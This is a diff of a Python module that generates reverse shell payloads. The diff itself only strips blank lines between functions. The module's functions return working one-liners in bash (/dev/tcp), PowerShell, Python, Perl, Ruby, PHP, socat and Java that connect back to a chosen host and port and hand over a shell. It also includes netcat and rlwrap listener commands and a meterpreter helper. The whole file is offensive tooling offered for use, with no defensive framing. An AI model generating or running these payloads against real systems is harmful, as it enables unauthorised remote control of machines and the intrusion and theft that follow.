@@ -16,11 +16,9 @@ __all__ = [
     "meterpreter_command",
 ]
 
-
 def bash_reverse_shell(lhost: str, lport: int) -> str:
     """Return a bash TCP reverse shell one-liner."""
     return f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
-
 
 def powershell_reverse_shell(lhost: str, lport: int) -> str:
     """Return an encoded PowerShell reverse shell one-liner."""
@@ -39,7 +37,6 @@ def powershell_reverse_shell(lhost: str, lport: int) -> str:
         " ".join(parts).format(host=lhost, port=lport)
     )
 
-
 def python_reverse_shell(lhost: str, lport: int, *, python: str = "python3") -> str:
     """Return a Python reverse shell one-liner."""
     script = (
@@ -51,7 +48,6 @@ def python_reverse_shell(lhost: str, lport: int, *, python: str = "python3") -> 
     )
     return f"{python} -c '{script}'"
 
-
 def perl_reverse_shell(lhost: str, lport: int) -> str:
     """Return a Perl reverse shell one-liner."""
     return (
@@ -61,7 +57,6 @@ def perl_reverse_shell(lhost: str, lport: int) -> str:
         f'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''
     )
 
-
 def ruby_reverse_shell(lhost: str, lport: int) -> str:
     """Return a Ruby reverse shell one-liner."""
     return (
@@ -70,7 +65,6 @@ def ruby_reverse_shell(lhost: str, lport: int) -> str:
         f'while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}};end\''
     )
 
-
 def php_reverse_shell(lhost: str, lport: int) -> str:
     """Return a PHP reverse shell one-liner."""
     return (
@@ -78,11 +72,9 @@ def php_reverse_shell(lhost: str, lport: int) -> str:
         f'$proc=proc_open("/bin/sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);\''
     )
 
-
 def socat_reverse_shell(lhost: str, lport: int) -> str:
     """Return a socat reverse shell command."""
     return f"socat TCP:{lhost}:{lport} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
-
 
 def java_reverse_shell(lhost: str, lport: int) -> str:
     """Return a Java runtime exec reverse shell snippet (for use in script contexts)."""
@@ -93,7 +85,6 @@ def java_reverse_shell(lhost: str, lport: int) -> str:
         f"p.waitFor();"
     )
 
-
 def ncat_listener(port: int, *, ssl: bool = False, verbose: bool = False) -> str:
     """Return a netcat/ncat listener command."""
     flags = ["-lvnp", str(port)]
@@ -103,11 +94,9 @@ def ncat_listener(port: int, *, ssl: bool = False, verbose: bool = False) -> str
         flags.append("-v")
     return "nc " + " ".join(flags)
 
-
 def rlwrap_listener(port: int) -> str:
     """Return an rlwrap-wrapped nc listener for improved interactive shell handling."""
     return f"rlwrap nc -lvnp {port}"
-
 
 def meterpreter_command(
     lhost: str,
